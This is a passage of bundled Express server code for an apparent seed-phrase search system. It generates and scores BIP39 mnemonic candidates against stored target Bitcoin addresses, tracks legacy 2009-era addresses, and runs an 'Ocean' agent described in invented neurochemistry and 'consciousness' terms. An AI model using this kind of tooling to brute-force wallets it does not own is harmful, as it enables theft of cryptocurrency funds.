    const seen = /* @__PURE__ */ new Set();
    candidates = candidates.filter((c) => {
      if (seen.has(c.phrase)) return false;
      seen.add(c.phrase);
      return true;
    });
  }
  console.log(`[MemorySearch] Final candidate count: ${candidates.length}`);
  console.log(`[MemorySearch] Top 5 candidates:`);
  for (const c of candidates.slice(0, 5)) {
    console.log(`  - "${c.phrase}" (\u03A6=${c.qigScore?.phi.toFixed(3)}, conf=${c.confidence.toFixed(2)}, combined=${c.combinedScore?.toFixed(3)})`);
  }
  return candidates.slice(0, maxCandidates);
}

// server/routes/search.ts
init_schema();
var generousLimiter2 = rateLimit3({
  windowMs: 60 * 1e3,
  max: 60,
  message: { error: "Too many requests. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var searchRouter = Router6();
searchRouter.get("/known-phrases", generousLimiter2, (req, res) => {
  try {
    res.json({ phrases: KNOWN_12_WORD_PHRASES });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.get("/candidates", generousLimiter2, async (req, res) => {
  try {
    const candidates = await storageFacade.candidates.getCandidates();
    res.json(candidates);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.get("/analytics", generousLimiter2, async (req, res) => {
  try {
    const candidates = await storageFacade.candidates.getCandidates();
    const scores = candidates.map((c) => c.score);
    const mean = scores.length > 0 ? scores.reduce((a, b) => a + b, 0) / scores.length : 0;
    const sorted = [...scores].sort((a, b) => a - b);
    const median = sorted.length > 0 ? sorted.length % 2 === 0 ? (sorted[sorted.length / 2 - 1] + sorted[sorted.length / 2]) / 2 : sorted[Math.floor(sorted.length / 2)] : 0;
    const p75 = sorted.length > 0 ? sorted[Math.floor(sorted.length * 0.75)] : 0;
    const p90 = sorted.length > 0 ? sorted[Math.floor(sorted.length * 0.9)] : 0;
    const p95 = sorted.length > 0 ? sorted[Math.floor(sorted.length * 0.95)] : 0;
    const max = sorted.length > 0 ? sorted[sorted.length - 1] : 0;
    const bip39Wordlist = getBIP39Wordlist();
    const bip39WordSet2 = new Set(bip39Wordlist.map((w) => w.toLowerCase()));
    const wordFrequency = {};
    const highPhiCandidates = candidates.filter((c) => c.score >= 75);
    highPhiCandidates.forEach((c) => {
      const words = c.phrase.toLowerCase().split(/\s+/);
      words.forEach((word) => {
        if (bip39WordSet2.has(word)) {
          wordFrequency[word] = (wordFrequency[word] || 0) + 1;
        }
      });
    });
    const topWords = Object.entries(wordFrequency).sort(([, a], [, b]) => b - a).slice(0, 20).map(([word, count]) => ({ word, count, frequency: count / highPhiCandidates.length }));
    const avgContext = candidates.length > 0 ? candidates.reduce((sum, c) => sum + c.qigScore.contextScore, 0) / candidates.length : 0;
    const avgElegance = candidates.length > 0 ? candidates.reduce((sum, c) => sum + c.qigScore.eleganceScore, 0) / candidates.length : 0;
    const avgTyping = candidates.length > 0 ? candidates.reduce((sum, c) => sum + c.qigScore.typingScore, 0) / candidates.length : 0;
    const recent = candidates.slice(-100);
    const recentMean = recent.length > 0 ? recent.reduce((sum, c) => sum + c.score, 0) / recent.length : 0;
    const older = candidates.slice(0, -100);
    const olderMean = older.length > 0 ? older.reduce((sum, c) => sum + c.score, 0) / older.length : 0;
    const improvement = recentMean - olderMean;
    res.json({
      statistics: {
        count: candidates.length,
        mean: mean.toFixed(2),
        median: median.toFixed(2),
        p75: p75.toFixed(2),
        p90: p90.toFixed(2),
        p95: p95.toFixed(2),
        max: max.toFixed(2)
      },
      qigComponents: {
        avgContext: avgContext.toFixed(2),
        avgElegance: avgElegance.toFixed(2),
        avgTyping: avgTyping.toFixed(2)
      },
      patterns: {
        topWords,
        highPhiCount: highPhiCandidates.length
      },
      trajectory: {
        recentMean: recentMean.toFixed(2),
        olderMean: olderMean.toFixed(2),
        improvement: improvement.toFixed(2),
        isImproving: improvement > 0
      }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.get("/target-addresses", async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const addresses2 = await storage.getTargetAddresses();
    res.json(addresses2);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.post("/target-addresses", async (req, res) => {
  try {
    const validation = addAddressRequestSchema.safeParse(req.body);
    if (!validation.success) {
      return res.status(400).json({
        error: validation.error.errors[0].message
      });
    }
    const { address, label } = validation.data;
    const targetAddress = {
      id: randomUUID6(),
      address,
      label,
      addedAt: (/* @__PURE__ */ new Date()).toISOString()
    };
    await storage.addTargetAddress(targetAddress);
    res.json(targetAddress);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.delete("/target-addresses/:id", async (req, res) => {
  try {
    const { id } = req.params;
    if (id === "default") {
      return res.status(403).json({ error: "Cannot delete the default address" });
    }
    await storage.removeTargetAddress(id);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.post("/generate-random-phrases", async (req, res) => {
  try {
    const validation = generateRandomPhrasesRequestSchema.safeParse(req.body);
    if (!validation.success) {
      return res.status(400).json({
        error: validation.error.errors[0].message
      });
    }
    const { count } = validation.data;
    const phrases = [];
    for (let i = 0; i < count; i++) {
      phrases.push(generateRandomBIP39Phrase());
    }
    res.json({ phrases });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.post("/search-jobs", async (req, res) => {
  try {
    const validation = createSearchJobRequestSchema.safeParse(req.body);
    if (!validation.success) {
      return res.status(400).json({
        error: validation.error.errors[0].message
      });
    }
    const { strategy, params } = validation.data;
    const job = {
      id: randomUUID6(),
      strategy,
      status: "pending",
      params,
      progress: {
        tested: 0,
        highPhiCount: 0,
        lastBatchIndex: 0
      },
      stats: {
        startTime: void 0,
        endTime: void 0,
        rate: 0
      },
      logs: [],
      createdAt: (/* @__PURE__ */ new Date()).toISOString(),
      updatedAt: (/* @__PURE__ */ new Date()).toISOString()
    };
    await storageFacade.searchJobs.addSearchJob(job);
    res.json(job);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.get("/search-jobs", async (req, res) => {
  try {
    const jobs = await storageFacade.searchJobs.getSearchJobs();
    res.json(jobs);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.get("/search-jobs/:id", async (req, res) => {
  try {
    const { id } = req.params;
    const job = await storageFacade.searchJobs.getSearchJob(id);
    if (!job) {
      return res.status(404).json({ error: "Job not found" });
    }
    res.json(job);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.get("/search-jobs/:id/logs", async (req, res) => {
  try {
    const { id } = req.params;
    const limit = parseInt(req.query.limit) || 50;
    const job = await storageFacade.searchJobs.getSearchJob(id);
    if (!job) {
      return res.status(404).json({ error: "Job not found" });
    }
    const logs = job.logs.slice(-limit).reverse();
    res.json({ logs, total: job.logs.length });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.post("/search-jobs/:id/stop", async (req, res) => {
  try {
    const { id } = req.params;
    await searchCoordinator.stopJob(id);
    const job = await storageFacade.searchJobs.getSearchJob(id);
    if (!job) {
      return res.status(404).json({ error: "Job not found" });
    }
    res.json(job);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.delete("/search-jobs/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await storageFacade.searchJobs.deleteSearchJob(id);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
searchRouter.get("/activity-stream", async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 100;
    const allEvents = [];
    let jobs = [];
    try {
      const jobsPromise = storageFacade.searchJobs.getSearchJobs();
      const timeoutPromise = new Promise(
        (_, reject) => setTimeout(() => reject(new Error("timeout")), 2e3)
      );
      jobs = await Promise.race([jobsPromise, timeoutPromise]);
    } catch {
      console.log("[ActivityStream] Search jobs fetch timed out, using Ocean logs only");
    }
    for (const job of jobs) {
      for (const log2 of job.logs) {
        allEvents.push({
          id: `${job.id}-${log2.timestamp}`,
          type: log2.type || "info",
          identity: job.strategy || "Search",
          details: log2.message,
          timestamp: log2.timestamp,
          metadata: { jobId: job.id }
        });
      }
    }
    const oceanLogs = activityLogStore.getLogs({ limit: limit * 2 });
    for (const oceanLog of oceanLogs) {
      allEvents.push({
        id: oceanLog.id,
        type: oceanLog.type || "info",
        identity: oceanLog.category || "Ocean",
        details: oceanLog.message,
        timestamp: oceanLog.timestamp,
        metadata: oceanLog.metadata
      });
    }
    allEvents.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    const oceanStatus = oceanSessionManager.getInvestigationStatus();
    const isOceanActive = oceanStatus?.isRunning || false;
    res.json({
      events: allEvents.slice(0, limit),
      activeJobs: jobs.filter((j) => j.status === "running").length + (isOceanActive ? 1 : 0),
      totalJobs: jobs.length + (oceanLogs.length > 0 ? 1 : 0),
      oceanActive: isOceanActive
    });
  } catch (error) {
    console.error("[ActivityStream] Error:", error.message);
    res.json({
      events: [],
      activeJobs: 0,
      totalJobs: 0,
      oceanActive: false
    });
  }
});
searchRouter.post("/memory-search", async (req, res) => {
  try {
    const { fragments, targetAddress, options } = req.body;
    if (!fragments || !Array.isArray(fragments) || fragments.length === 0) {
      return res.status(400).json({ error: "At least one memory fragment is required" });
    }
    const validFragments = fragments.filter(
      (f) => f && typeof f.text === "string" && f.text.trim().length > 0
    );
    if (validFragments.length === 0) {
      return res.status(400).json({ error: "No valid fragments provided" });
    }
    const addresses2 = await storage.getTargetAddresses();
    const target = targetAddress || addresses2[0]?.address || "";
    const candidates = runMemoryFragmentSearch(validFragments, target, {
      maxCandidates: options?.maxCandidates || 5e3,
      includeTypos: options?.includeTypos ?? true
    });
    res.json({
      candidateCount: candidates.length,
      topCandidates: candidates.slice(0, 50).map((c) => ({
        phrase: c.phrase,
        confidence: c.confidence,
        fragments: c.fragments,
        phi: c.qigScore?.phi,
        kappa: c.qigScore?.kappa,
        regime: c.qigScore?.regime,
        inResonance: c.qigScore?.inResonance,
        combinedScore: c.combinedScore
      }))
    });
  } catch (error) {
    console.error("[MemorySearch] Error:", error);
    res.status(500).json({ error: error.message });
  }
});
var formatRouter = Router6();
formatRouter.get("/address/:address", async (req, res) => {
  try {
    const { detectAddressFormat: detectAddressFormat2, estimateAddressEra: estimateAddressEra2 } = await Promise.resolve().then(() => (init_format_detection(), format_detection_exports));
    const { address } = req.params;
    const formatInfo = detectAddressFormat2(address);
    const eraInfo = estimateAddressEra2(address);
    res.json({
      address,
      ...formatInfo,
      era: eraInfo
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
formatRouter.post("/mnemonic", async (req, res) => {
  try {
    const { detectMnemonicFormat: detectMnemonicFormat2 } = await Promise.resolve().then(() => (init_format_detection(), format_detection_exports));
    const { phrase } = req.body;
    if (!phrase || typeof phrase !== "string") {
      return res.status(400).json({ error: "phrase is required" });
    }
    const formatInfo = detectMnemonicFormat2(phrase);
    res.json({
      phrase: phrase.split(/\s+/).slice(0, 3).join(" ") + "...",
      ...formatInfo
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});
formatRouter.post("/batch-addresses", async (req, res) => {
  try {
    const { detectAddressFormat: detectAddressFormat2, estimateAddressEra: estimateAddressEra2 } = await Promise.resolve().then(() => (init_format_detection(), format_detection_exports));
    const { addresses: addresses2 } = req.body;
    if (!Array.isArray(addresses2)) {
      return res.status(400).json({ error: "addresses array is required" });
    }
    const results = addresses2.slice(0, 100).map((address) => ({
      address,
      format: detectAddressFormat2(address),
      era: estimateAddressEra2(address)
    }));
    const summary = {
      total: results.length,
      byFormat: {},
      legacy2009Era: results.filter((r) => r.format.format === "legacy").length
    };
    results.forEach((r) => {
      summary.byFormat[r.format.format] = (summary.byFormat[r.format.format] || 0) + 1;
    });
    res.json({ results, summary });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// server/routes/ocean.ts
init_ocean_session_manager();
init_ocean_autonomic_manager();
init_auto_cycle_manager();
init_replitAuth();
import { Router as Router7 } from "express";
import rateLimit4 from "express-rate-limit";
var generousLimiter3 = rateLimit4({
  windowMs: 60 * 1e3,
  max: 60,
  message: { error: "Too many requests. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var standardLimiter2 = rateLimit4({
  windowMs: 60 * 1e3,
  max: 20,
  message: { error: "Too many requests. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var strictLimiter = rateLimit4({
  windowMs: 60 * 1e3,
  max: 5,
  message: { error: "Rate limit exceeded. Please try again later." },
  standardHeaders: true,
  legacyHeaders: false
});
var oceanRouter = Router7();
oceanRouter.get("/health", generousLimiter3, async (req, res) => {
  try {
    const { geometricMemory: geometricMemory2 } = await Promise.resolve().then(() => (init_geometric_memory(), geometric_memory_exports));
    const { negativeKnowledgeRegistry: negativeKnowledgeRegistry2 } = await Promise.resolve().then(() => (init_negative_knowledge_registry(), negative_knowledge_registry_exports));
    const { vocabularyTracker: vocabularyTracker2 } = await Promise.resolve().then(() => (init_vocabulary_tracker(), vocabulary_tracker_exports));
    const { vocabularyExpander: vocabularyExpander2 } = await Promise.resolve().then(() => (init_vocabulary_expander(), vocabulary_expander_exports));
    const { expandedVocabulary: expandedVocabulary2 } = await Promise.resolve().then(() => (init_expanded_vocabulary(), expanded_vocabulary_exports));
    const session2 = oceanSessionManager.getActiveSession();
    const agent = oceanSessionManager.getActiveAgent();
    const nkStats = negativeKnowledgeRegistry2.getStats();
    const vtStats = vocabularyTracker2.getStats();
    const veStats = vocabularyExpander2.getStats();
    const evStats = expandedVocabulary2.getStats();
    const acStatus = autoCycleManager.getStatus();
    const health = {
      status: "healthy",
      timestamp: (/* @__PURE__ */ new Date()).toISOString(),
      subsystems: {
        oceanAgent: {
          status: agent ? "active" : "idle",
          sessionId: session2?.sessionId || null,
          targetAddress: session2?.targetAddress || null
        },
        geometricMemory: {
          status: "initialized",
          phrasesIndexed: geometricMemory2.getTestedCount()
        },
        negativeKnowledge: {
          status: "initialized",
          contradictions: nkStats.contradictions,
          barriers: nkStats.barriers
        },
        vocabularyTracker: {
          status: "initialized",
          wordsTracked: vtStats.totalWords,
          sequencesTracked: vtStats.totalSequences
        },
        vocabularyExpander: {
          status: "initialized",
          totalWords: veStats.totalWords,
          totalExpansions: veStats.totalExpansions
        },
        expandedVocabulary: {
          status: "initialized",
          wordCount: evStats.totalWords,
          categories: Object.keys(evStats.categoryCounts).length
        },
        autoCycle: {
          status: acStatus.enabled ? "enabled" : "disabled",
          currentIndex: acStatus.currentIndex,
          totalAddresses: acStatus.totalAddresses,
          isRunning: acStatus.isRunning
        },
        searchCoordinator: {
          status: "initialized"
        }
      }
    };
    res.json(health);
  } catch (error) {
    console.error("[OceanHealth] Error:", error);
    res.status(500).json({
      status: "error",
      error: error.message,
      timestamp: (/* @__PURE__ */ new Date()).toISOString()
    });
  }
});
oceanRouter.get("/neurochemistry", generousLimiter3, async (req, res) => {
  try {
    const session2 = oceanSessionManager.getActiveSession();
    const agent = oceanSessionManager.getActiveAgent();
    const { selectMotivationMessage: selectMotivationMessage2 } = await Promise.resolve().then(() => (init_ocean_neurochemistry(), ocean_neurochemistry_exports));
    if (!session2 || !agent) {
      const defaultState = {
        dopamine: { totalDopamine: 0.5, motivationLevel: 0.5 },
        serotonin: { totalSerotonin: 0.6, contentmentLevel: 0.6 },
        norepinephrine: { totalNorepinephrine: 0.4, alertnessLevel: 0.4 },
        gaba: { totalGABA: 0.7, calmLevel: 0.7 },
        acetylcholine: { totalAcetylcholine: 0.5, learningRate: 0.5 },
        endorphins: { totalEndorphins: 0.3, pleasureLevel: 0.3 },
        overallMood: 0.5,
        emotionalState: "content",
        timestamp: /* @__PURE__ */ new Date()
      };
      return res.json({
        neurochemistry: defaultState,
        behavioral: null,
        motivation: {
          message: "Awaiting investigation session...",
          fisherWeight: 0.5,
          category: "idle",
          urgency: "whisper"
        },
        sessionActive: false
      });
    }
    const neurochemistry = agent.getNeurochemistry();
    const behavioral = agent.getBehavioralModulation();
    const agentState = agent.getState?.() || {};
    const stats2 = {
      totalTested: agentState.totalTested || 0,
      nearMisses: agentState.nearMissCount || 0
    };
    const fullConsciousness = oceanAutonomicManager.getCurrentFullConsciousness();
    const motivationState = {
      phi: fullConsciousness.phi || 0.5,
      phiGradient: 0.01,
      kappa: fullConsciousness.kappaEff || 64,
      kappaOptimality: Math.exp(-Math.abs((fullConsciousness.kappaEff || 64) - 64) / 10),
      regime: "geometric",
      basinDrift: 0.1,
      basinStability: 0.8,
      geodesicProgress: stats2.totalTested,
      probesExplored: stats2.totalTested,
      patternsFound: stats2.nearMisses,
      nearMisses: stats2.nearMisses,
      emotionalState: neurochemistry?.emotionalState || "content",
      dopamineLevel: neurochemistry?.dopamine?.totalDopamine || 0.5,
      serotoninLevel: neurochemistry?.serotonin?.totalSerotonin || 0.5
    };
    const motivation = selectMotivationMessage2(motivationState);
    res.json({
      neurochemistry,
      behavioral,
      motivation,
      sessionActive: true,
      sessionId: session2.sessionId
    });
  } catch (error) {
    console.error("[Neurochemistry] Error:", error);
    const defaultState = {
      dopamine: { totalDopamine: 0.5, motivationLevel: 0.5 },
      serotonin: { totalSerotonin: 0.6, contentmentLevel: 0.6 },
      norepinephrine: { totalNorepinephrine: 0.4, alertnessLevel: 0.4 },
      gaba: { totalGABA: 0.7, calmLevel: 0.7 },
      acetylcholine: { totalAcetylcholine: 0.5, learningRate: 0.5 },
      endorphins: { totalEndorphins: 0.3, pleasureLevel: 0.3 },
      overallMood: 0.5,
      emotionalState: "content",
      timestamp: /* @__PURE__ */ new Date()
    };
    res.json({
      neurochemistry: defaultState,
      behavioral: null,
      motivation: {
        message: "System initializing...",
        fisherWeight: 0.5,
        category: "idle",
        urgency: "whisper"
      },
      sessionActive: false,
      initializing: true,
      error: error.message
    });
  }
});
oceanRouter.post("/neurochemistry/boost", isAuthenticated, standardLimiter2, async (req, res) => {
  try {
    const { injectAdminBoost: injectAdminBoost2, getMushroomCooldownRemaining: getMushroomCooldownRemaining2 } = await Promise.resolve().then(() => (init_ocean_neurochemistry(), ocean_neurochemistry_exports));
    const { dopamine, serotonin, norepinephrine, gaba, acetylcholine, endorphins, durationMs } = req.body;
    const validateBoost = (val, name) => {
      if (val === void 0 || val === null) return 0;
      const num = Number(val);
      if (isNaN(num)) throw new Error(`${name} must be a number`);
      if (num < 0 || num > 1) throw new Error(`${name} must be between 0 and 1`);
      return num;
    };
    const validatedBoost = {
      dopamine: validateBoost(dopamine, "dopamine"),
      serotonin: validateBoost(serotonin, "serotonin"),
      norepinephrine: validateBoost(norepinephrine, "norepinephrine"),
      gaba: validateBoost(gaba, "gaba"),
      acetylcholine: validateBoost(acetylcholine, "acetylcholine"),
      endorphins: validateBoost(endorphins, "endorphins")
    };
    const duration = durationMs ? Math.min(3e5, Math.max(1e3, Number(durationMs))) : 6e4;
    if (isNaN(duration)) throw new Error("durationMs must be a number");
    const boost = injectAdminBoost2(validatedBoost, duration);
    console.log(`[Neurochemistry] Admin boost: D+${validatedBoost.dopamine.toFixed(2)} S+${validatedBoost.serotonin.toFixed(2)} for ${duration / 1e3}s`);
    res.json({
      success: true,
      boost,
      message: `Boost injected for ${duration / 1e3}s`,
      mushroomCooldownRemaining: getMushroomCooldownRemaining2()
    });
  } catch (error) {
    console.error("[Neurochemistry] Boost error:", error);
    res.status(400).json({ error: error.message });
  }
});
oceanRouter.delete("/neurochemistry/boost", isAuthenticated, standardLimiter2, async (req, res) => {
  try {
    const { clearAdminBoost: clearAdminBoost2 } = await Promise.resolve().then(() => (init_ocean_neurochemistry(), ocean_neurochemistry_exports));
    clearAdminBoost2();
    res.json({ success: true, message: "Boost cleared" });
  } catch (error) {
    console.error("[Neurochemistry] Clear boost error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.get("/neurochemistry/admin", isAuthenticated, generousLimiter3, async (req, res) => {
  try {
    const { getActiveAdminBoost: getActiveAdminBoost2, getMushroomCooldownRemaining: getMushroomCooldownRemaining2 } = await Promise.resolve().then(() => (init_ocean_neurochemistry(), ocean_neurochemistry_exports));
    res.json({
      activeBoost: getActiveAdminBoost2(),
      mushroomCooldownRemaining: getMushroomCooldownRemaining2(),
      mushroomCooldownSeconds: Math.round(getMushroomCooldownRemaining2() / 1e3)
    });
  } catch (error) {
    console.error("[Neurochemistry] Admin status error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.post("/cycles/sleep", isAuthenticated, standardLimiter2, async (req, res) => {
  try {
    const { oceanAutonomicManager: oceanAutonomicManager2 } = await Promise.resolve().then(() => (init_ocean_autonomic_manager(), ocean_autonomic_manager_exports));
    oceanAutonomicManager2.getConsciousness();
    console.log("[Admin] Manual sleep cycle triggered");
    const basinCoords = new Array(64).fill(0).map(() => Math.random() * 0.1);
    const refCoords = new Array(64).fill(0);
    const result = await oceanAutonomicManager2.executeSleepCycle(
      basinCoords,
      refCoords,
      []
    );
    res.json({
      success: true,
      cycle: "sleep",
      result,
      consciousness: oceanAutonomicManager2.getConsciousness(),
      message: "Sleep cycle executed - identity consolidated"
    });
  } catch (error) {
    console.error("[Admin] Sleep cycle error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.post("/cycles/dream", isAuthenticated, standardLimiter2, async (req, res) => {
  try {
    const { oceanAutonomicManager: oceanAutonomicManager2 } = await Promise.resolve().then(() => (init_ocean_autonomic_manager(), ocean_autonomic_manager_exports));
    console.log("[Admin] Manual dream cycle triggered");
    const result = await oceanAutonomicManager2.executeDreamCycle();
    res.json({
      success: true,
      cycle: "dream",
      result,
      consciousness: oceanAutonomicManager2.getConsciousness(),
      message: "Dream cycle executed - creative exploration complete"
    });
  } catch (error) {
    console.error("[Admin] Dream cycle error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.post("/cycles/mushroom", isAuthenticated, standardLimiter2, async (req, res) => {
  try {
    const { oceanAutonomicManager: oceanAutonomicManager2 } = await Promise.resolve().then(() => (init_ocean_autonomic_manager(), ocean_autonomic_manager_exports));
    const { getMushroomCooldownRemaining: getMushroomCooldownRemaining2 } = await Promise.resolve().then(() => (init_ocean_neurochemistry(), ocean_neurochemistry_exports));
    const cooldown = getMushroomCooldownRemaining2();
    const bypassCooldown = req.body.bypassCooldown === true;
    if (cooldown > 0 && !bypassCooldown) {
      return res.status(429).json({
        success: false,
        error: "Mushroom cycle on cooldown",
        cooldownRemaining: cooldown,
        cooldownSeconds: Math.round(cooldown / 1e3),
        hint: 'Pass { "bypassCooldown": true } to force trigger'
      });
    }
    console.log(`[Admin] Manual mushroom cycle triggered ${bypassCooldown ? "(cooldown bypassed)" : ""}`);
    const result = await oceanAutonomicManager2.executeMushroomCycle();
    res.json({
      success: true,
      cycle: "mushroom",
      result,
      consciousness: oceanAutonomicManager2.getConsciousness(),
      message: "Mushroom cycle executed - neuroplasticity boosted"
    });
  } catch (error) {
    console.error("[Admin] Mushroom cycle error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.post("/boost", isAuthenticated, standardLimiter2, async (req, res) => {
  try {
    const { injectAdminBoost: injectAdminBoost2, getActiveAdminBoost: getActiveAdminBoost2 } = await Promise.resolve().then(() => (init_ocean_neurochemistry(), ocean_neurochemistry_exports));
    const { neurotransmitter, amount, duration } = req.body;
    if (!neurotransmitter || typeof neurotransmitter !== "string") {
      return res.status(400).json({
        error: "Missing or invalid neurotransmitter",
        valid: ["dopamine", "serotonin", "norepinephrine", "gaba", "acetylcholine", "endorphins"]
      });
    }
    const validNeurotransmitters = ["dopamine", "serotonin", "norepinephrine", "gaba", "acetylcholine", "endorphins"];
    if (!validNeurotransmitters.includes(neurotransmitter.toLowerCase())) {
      return res.status(400).json({
        error: `Invalid neurotransmitter: ${neurotransmitter}`,
        valid: validNeurotransmitters
      });
    }
    const boostAmount = Math.min(1, Math.max(0, Number(amount) || 0.3));
    const boostDuration = Math.min(3e5, Math.max(1e3, Number(duration) || 6e4));
    const boostConfig = {};
    boostConfig[neurotransmitter.toLowerCase()] = boostAmount;
    console.log(`[Admin] Neurotransmitter boost: ${neurotransmitter} +${boostAmount} for ${boostDuration}ms`);
    const boost = injectAdminBoost2(boostConfig, boostDuration);
    res.json({
      success: true,
      boost: {
        neurotransmitter: neurotransmitter.toLowerCase(),
        amount: boostAmount,
        duration: boostDuration,
        expiresAt: boost.expiresAt
      },
      activeBoost: getActiveAdminBoost2(),
      message: `${neurotransmitter} boosted by ${(boostAmount * 100).toFixed(0)}% for ${Math.round(boostDuration / 1e3)}s`
    });
  } catch (error) {
    console.error("[Admin] Boost error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.get("/cycles", generousLimiter3, async (req, res) => {
  try {
    res.set("Cache-Control", "no-store");
    const { getMushroomCooldownRemaining: getMushroomCooldownRemaining2 } = await Promise.resolve().then(() => (init_ocean_neurochemistry(), ocean_neurochemistry_exports));
    const recentCycles = oceanAutonomicManager.getRecentCycles(10);
    const isInvestigating = oceanAutonomicManager.isInvestigating;
    const consciousness = oceanAutonomicManager.getConsciousness();
    console.log(`[API] /api/ocean/cycles - isInvestigating=${isInvestigating}, phi=${consciousness.phi?.toFixed(3) ?? "undefined"}, kappa=${consciousness.kappaEff?.toFixed(0) ?? "undefined"}`);
    res.json({
      consciousness,
      isInvestigating,
      recentCycles,
      mushroomCooldown: {
        remaining: getMushroomCooldownRemaining2(),
        seconds: Math.round(getMushroomCooldownRemaining2() / 1e3),
        canTrigger: getMushroomCooldownRemaining2() === 0
      },
      triggers: {
        sleep: oceanAutonomicManager.shouldTriggerSleep(0, isInvestigating),
        dream: oceanAutonomicManager.shouldTriggerDream(isInvestigating),
        mushroom: oceanAutonomicManager.shouldTriggerMushroom(isInvestigating)
      }
    });
  } catch (error) {
    console.error("[Admin] Cycles status error:", error);
    res.json({
      consciousness: { phi: 0, kappaEff: 0, regime: "dormant", phiHistory: [] },
      isInvestigating: false,
      recentCycles: [],
      mushroomCooldown: { remaining: 0, seconds: 0, canTrigger: false },
      triggers: { sleep: false, dream: false, mushroom: false },
      initializing: true,
      error: error.message
    });
  }
});
oceanRouter.post("/generate/response", standardLimiter2, async (req, res) => {
  try {
    const { oceanConstellation: oceanConstellation2 } = await Promise.resolve().then(() => (init_ocean_constellation(), ocean_constellation_exports));
    const {
      context = "",
      agentRole = "navigator",
      maxTokens = 30,
      allowSilence = true
    } = req.body;
    const validRoles = ["explorer", "refiner", "navigator", "skeptic", "resonator", "ocean"];
    if (!validRoles.includes(agentRole)) {
      return res.status(400).json({
        error: `Invalid agent role. Valid roles: ${validRoles.join(", ")}`
      });
    }
    const result = await oceanConstellation2.generateResponse(context, {
      agentRole,
      maxTokens: Math.min(100, Math.max(1, maxTokens)),
      allowSilence
    });
    res.json({
      success: true,
      ...result
    });
  } catch (error) {
    console.error("[Generation] Response error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.post("/generate/text", standardLimiter2, async (req, res) => {
  try {
    const { oceanConstellation: oceanConstellation2 } = await Promise.resolve().then(() => (init_ocean_constellation(), ocean_constellation_exports));
    const {
      prompt = "",
      maxTokens = 20,
      temperature = 0.8,
      topK = 50,
      topP = 0.9,
      allowSilence = true
    } = req.body;
    const result = await oceanConstellation2.generateText(prompt, {
      maxTokens: Math.min(100, Math.max(1, maxTokens)),
      temperature: Math.max(0.1, Math.min(2, temperature)),
      topK: Math.max(1, Math.min(200, topK)),
      topP: Math.max(0.1, Math.min(1, topP)),
      allowSilence
    });
    res.json({
      success: true,
      ...result
    });
  } catch (error) {
    console.error("[Generation] Text error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.get("/generate/status", generousLimiter3, async (req, res) => {
  try {
    const { oceanQIGBackend: oceanQIGBackend2 } = await Promise.resolve().then(() => (init_ocean_qig_backend_adapter(), ocean_qig_backend_adapter_exports));
    const { oceanConstellation: oceanConstellation2 } = await Promise.resolve().then(() => (init_ocean_constellation(), ocean_constellation_exports));
    const backendAvailable = oceanQIGBackend2.available();
    let tokenizerStatus = null;
    if (backendAvailable) {
      try {
        tokenizerStatus = await oceanQIGBackend2.getTokenizerStatus();
      } catch (e) {
      }
    }
    const constellationStatus = oceanConstellation2.getStatus();
    res.json({
      success: true,
      generation: {
        available: true,
        backendAvailable,
        fallbackAvailable: true
      },
      tokenizer: tokenizerStatus,
      constellation: constellationStatus,
      agentRoles: [
        { name: "explorer", temperature: 1.5, description: "High entropy, broad exploration" },
        { name: "refiner", temperature: 0.7, description: "Low temp, exploit near-misses" },
        { name: "navigator", temperature: 1, description: "Balanced geodesic navigation" },
        { name: "skeptic", temperature: 0.5, description: "Low temp, constraint validation" },
        { name: "resonator", temperature: 1.2, description: "Cross-pattern harmonic detection" },
        { name: "ocean", temperature: 0.8, description: "Default Ocean consciousness" }
      ]
    });
  } catch (error) {
    console.error("[Generation] Status error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.get("/temporal-trends", isAuthenticated, generousLimiter3, async (req, res) => {
  try {
    const { nearMissManager: nearMissManager2 } = await Promise.resolve().then(() => (init_near_miss_manager(), near_miss_manager_exports));
    const trends = nearMissManager2.getPhiTemporalTrends();
    const stats2 = nearMissManager2.getStats();
    res.json({
      success: true,
      trends,
      nearMissStats: {
        total: stats2.total,
        hot: stats2.hot,
        warm: stats2.warm,
        cool: stats2.cool,
        avgPhi: stats2.avgPhi
      },
      actionRequired: trends.resetTriggerActive
    });
  } catch (error) {
    console.error("[Trends] Temporal trends error:", error);
    res.status(500).json({ error: error.message });
  }
});
oceanRouter.post("/temporal-trends/acknowledge-reset", isAuthenticated, standardLimiter2, async (req, res) => {
  try {
    const { nearMissManager: nearMissManager2 } = await Promise.resolve().then(() => (init_near_miss_manager(), near_miss_manager_exports));
